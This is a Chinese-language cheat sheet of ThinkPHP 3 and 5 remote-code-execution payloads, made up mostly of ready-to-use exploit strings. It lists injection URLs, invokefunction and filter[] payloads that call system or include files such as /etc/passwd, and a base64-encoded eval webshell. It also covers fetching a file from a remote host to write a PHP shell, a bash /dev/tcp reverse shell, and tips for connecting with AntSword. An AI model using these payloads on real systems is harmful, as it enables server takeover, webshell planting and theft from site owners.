# Thinkphp——RCE

---

总结：3和5都有

```
https://www.cnblogs.com/0xdd/p/11102426.html

https://mp.weixin.qq.com/s?src=11&timestamp=1610677492&ver=2829&signature=qSAkzeeuM1ddHSQ-jdpYZlK*ZPNtriMl6TVSNeSL12Q-9vRtMoL954DUZOice6iV6-L3GJlY3bAtQAkcOciabH*oP6M-7c4*fdFLnUNt94w6OQi0EGTTNDhf1OGG*RfG&new=1

https://www.cnblogs.com/Mikasa-Ackerman/p/ThinkPhp-zhiRce-fen-xi.html
```



## Thinkphp3

Thinkphp3.2.3最新版update注入漏洞

```
/index.php/home/user?id[]=bind%27&money[]=1123&user=liao&id[0]=bind&id[1]=0%20and%20(updatexml(1,concat(0x7e,(select%20user()),0x7e),1))
```

信息泄露：

```
/index.php/home/res/re
```

后台getshell

```
后台标题：',@eval($_POST['a']),'
/application/common/conf/site.php
```

漏洞扫描+日志扫描：

```
https://github.com/sukabuliet/ThinkphpRCE
```





## Thinkphp5

index模块要存在，如果不存在就看哪个模块存在进行替换（如：home、admin  {s=home、s=admin}）

入口文件index.php可能在其他目录

均通过入口文件进行寻找模块：index.php?s= 

总结：

```
https://www.cnblogs.com/Mikasa-Ackerman/p/ThinkPhp-zhiRce-fen-xi.html
```

Thinkphp 5.0.7

```
/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat+/flag
```

Thinkphp 5.0.x

```
get:（开兼容模式）
/?s=index/think\config/get&name=database.username // 获取配置信息
/?s=index/\think\Lang/load&file=../../test.jpg    // 包含任意文件
/?s=index/\think\Config/load&file=../../t.php     // 包含任意.php文件
/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
/?s=index|think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][0]=whoami
---
post:未开强制路由，或利用变量覆盖达到命令执行
/?s=captcha
执行php函数：_method=__construct&method=get&filter[]=call_user_func&get[]=phpinfo
包含文件：   _method=__construct&method=get&filter[]=think\__include_file&server[]=-1&get[]=根目录
            _method=__construct&filter[]=strrev&filter[]=think\__include_file&method=get&server[]=1&get[]=根目录倒序文字（txt.1）
           _method=__construct&filter[]=strrev&filter[]=think\__include_file&method=get&server[]=1&get[]=
           txt.1=ecruoser/edocne-46esab.trevnoc=daer/retlif//:php    #包含看文件内容，base64编码预防编码错误
执行命令：   _method=__construct&filter[]=system&method=GET&get[]=whoami
-
/?s=captcha&test=phpinfo()  
 _method=__construct&filter[]=assert&method=get&server[REQUEST_METHOD]=-1
```

Thinkphp 5.1.x

```
/?s=index/\think\Request/input&filter[]=system&data=pwd
/?s=index/\think\view\driver\Php/display&content=<?php phpinfo();?>
/?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=<?php phpinfo();?>
/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id

post:未开强制路由，或利用变量覆盖达到命令执行
/?s=captcha
执行php函数：_method=__construct&method=get&filter[]=call_user_func&get[]=phpinfo
包含文件：   _method=__construct&filter[]=highlight_file&method=GET&get[]=/etc/passwd
执行命令：   s=whoami&_method=__construct&method=&filter[]=exec
```

Thinkphp常见日志路径：

```
3.
/application/runtime/logs/home/21_02_01.log
/application/runtime/logs/admin/21_02_01.log
/runtime/log/21_02_01.log
/runtime/log/202102/09.log
```

常用payload

```
cmd:PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=
写文件php代码：assert函数
	file_put_contents(写入文件路径，文件内容)
	file_put_contents('xx.php',base64_decode('一句话的base64'))
	file_put_contents(base64_decode('文件名的base64'),base64_decode('一句话的base64'))
	copy(复制路径,粘贴路径)
	copy('http://xxx.com/ss.txt','ss.php')
	解码执行以上语句的编码
		base64_decode('xxxx')
写文件执行命令：system函数
	echo ^一句话马^ >> xx.php

反弹shell:
	服务端：nc -lvp 服务端端口号
	反弹端: bash -i > /dev/tcp/服务端IP/服务端端口号
```

问题

```
1.如果phpinfo能执行，但是下面的不能执行，可能是没有权限写入
可以直接phpinfo替换成eval()一句话用蚁剑连接
2.没有权限写入时，可以试试蚁剑修改目录权限，再传，要传到能访问的目录中
```

